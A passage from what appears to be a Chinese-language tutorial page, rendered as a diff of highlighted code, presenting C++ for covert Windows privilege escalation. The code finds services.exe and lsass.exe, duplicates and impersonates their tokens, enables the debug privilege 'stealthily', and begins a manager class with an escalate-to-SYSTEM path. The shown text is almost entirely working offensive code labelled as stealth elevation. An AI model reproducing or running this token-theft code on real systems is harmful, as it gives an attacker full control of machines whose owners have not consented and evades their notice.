+<span class="line"><span style="color:#F97583">                               sizeof</span><span style="color:#E1E4E8">(elevation), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">returnLength)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> elevation.TokenIsElevated </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 执行隐蔽提权</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> PerformStealthElevation</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 方法1: 尝试从服务进程中获取令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetTokenFromService</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hToken) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ImpersonateLoggedOnUser</span><span style="color:#E1E4E8">(hToken)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                m_isElevated </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Stealth elevation successful via service</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 方法2: 尝试从本地安全机构获取令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        hToken </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetTokenFromLSA</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hToken) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ImpersonateLoggedOnUser</span><span style="color:#E1E4E8">(hToken)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                m_isElevated </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Stealth elevation successful via LSA</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 从服务获取令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#B392F0"> HANDLE</span><span style="color:#B392F0"> GetTokenFromService</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 查找services.exe进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD servicesPid </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetProcessIdByName</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"services.exe"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (servicesPid </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(servicesPid);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 从LSA获取令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#B392F0"> HANDLE</span><span style="color:#B392F0"> GetTokenFromLSA</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 查找lsass.exe进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD lsassPid </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetProcessIdByName</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"lsass.exe"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (lsassPid </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(lsassPid);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 通过进程名获取PID</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#B392F0"> DWORD</span><span style="color:#B392F0"> GetProcessIdByName</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> processName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hSnapshot </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateToolhelp32Snapshot</span><span style="color:#E1E4E8">(TH32CS_SNAPPROCESS, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hSnapshot </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PROCESSENTRY32 pe32 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        pe32.dwSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(PROCESSENTRY32);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32First</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe32)) {</span></span>
+<span class="line"><span style="color:#F97583">            do</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">_stricmp</span><span style="color:#E1E4E8">(pe32.szExeFile, processName) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">                    CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">                    return</span><span style="color:#E1E4E8"> pe32.th32ProcessID;</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            } </span><span style="color:#F97583">while</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32Next</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe32));</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 从进程复制令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#B392F0"> HANDLE</span><span style="color:#B392F0"> DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> processId</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hProcess </span><span style="color:#F97583">=</span><span style="color:#B392F0"> OpenProcess</span><span style="color:#E1E4E8">(PROCESS_QUERY_INFORMATION, FALSE, processId);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hProcess) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(hProcess, TOKEN_DUPLICATE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hNewToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">DuplicateTokenEx</span><span style="color:#E1E4E8">(hToken, TOKEN_ALL_ACCESS, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                             SecurityImpersonation, TokenImpersonation, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hNewToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> hNewToken;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启用特权（可选择是否显示详细信息）</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">bool</span><span style="color:#FFAB70"> verbose</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_ADJUST_PRIVILEGES </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (verbose) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to open process token: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        LUID luid;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">LookupPrivilegeValueA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, privilegeName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">luid)) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (verbose) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to lookup privilege value: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_PRIVILEGES tp;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.PrivilegeCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Luid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> luid;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Attributes </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> SE_PRIVILEGE_ENABLED;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BOOL result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> AdjustTokenPrivileges</span><span style="color:#E1E4E8">(hToken, FALSE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tp, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(TOKEN_PRIVILEGES), </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">result </span><span style="color:#F97583">||</span><span style="color:#B392F0"> GetLastError</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> ERROR_NOT_ALL_ASSIGNED) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (verbose) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to adjust token privileges</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (verbose) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Privilege enabled: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, privilegeName);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 静态成员初始化</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> StealthTokenPrivilege</span><span style="color:#E1E4E8">::m_isElevated </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试隐蔽提权</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestStealthTokenPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Stealth Token Privilege Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查当前状态</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Current elevation status: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#B392F0">           StealthTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">IsElevated</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">?</span><span style="color:#9ECBFF"> "Elevated"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> "Not elevated"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 初始化隐蔽提权</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Initializing stealth elevation...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">StealthTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">InitializeStealthElevation</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Stealth elevation successful</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] New elevation status: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#B392F0">               StealthTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">IsElevated</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">?</span><span style="color:#9ECBFF"> "Elevated"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> "Not elevated"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Stealth elevation failed</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 尝试启用调试权限</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Enabling debug privilege stealthily...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">StealthTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">StealthEnablePrivilege</span><span style="color:#E1E4E8">(SE_DEBUG_NAME)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Debug privilege enabled</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to enable debug privilege</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-11">4. 令牌提权管理器</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// token_manager.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 令牌提权管理器</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 提权级别枚举</span></span>
+<span class="line"><span style="color:#F97583">enum</span><span style="color:#F97583"> class</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#79B8FF">    None</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">           // 无提权</span></span>
+<span class="line"><span style="color:#79B8FF">    Medium</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">         // 中等级别</span></span>
+<span class="line"><span style="color:#79B8FF">    High</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">           // 高级别</span></span>
+<span class="line"><span style="color:#79B8FF">    System</span><span style="color:#6A737D">          // 系统级别</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 令牌提权管理器</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> TokenElevationManager</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE m_hCurrentToken;</span></span>
+<span class="line"><span style="color:#E1E4E8">    ElevationLevel m_currentLevel;</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::vector</span><span style="color:#F97583">&#x3C;</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::string</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> m_enabledPrivileges;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#B392F0">    TokenElevationManager</span><span style="color:#E1E4E8">() : </span><span style="color:#B392F0">m_hCurrentToken</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">), </span><span style="color:#B392F0">m_currentLevel</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">ElevationLevel</span><span style="color:#E1E4E8">::None) {</span></span>
+<span class="line"><span style="color:#B392F0">        Initialize</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    ~TokenElevationManager</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">        Cleanup</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取当前提权级别</span></span>
+<span class="line"><span style="color:#B392F0">    ElevationLevel</span><span style="color:#B392F0"> GetCurrentLevel</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">const</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> m_currentLevel;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 提升到指定级别</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> ElevateToLevel</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">ElevationLevel</span><span style="color:#FFAB70"> targetLevel</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> (targetLevel) {</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::Medium:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> ElevateToMedium</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::High:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> ElevateToHigh</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::System:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> ElevateToSystem</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            default</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
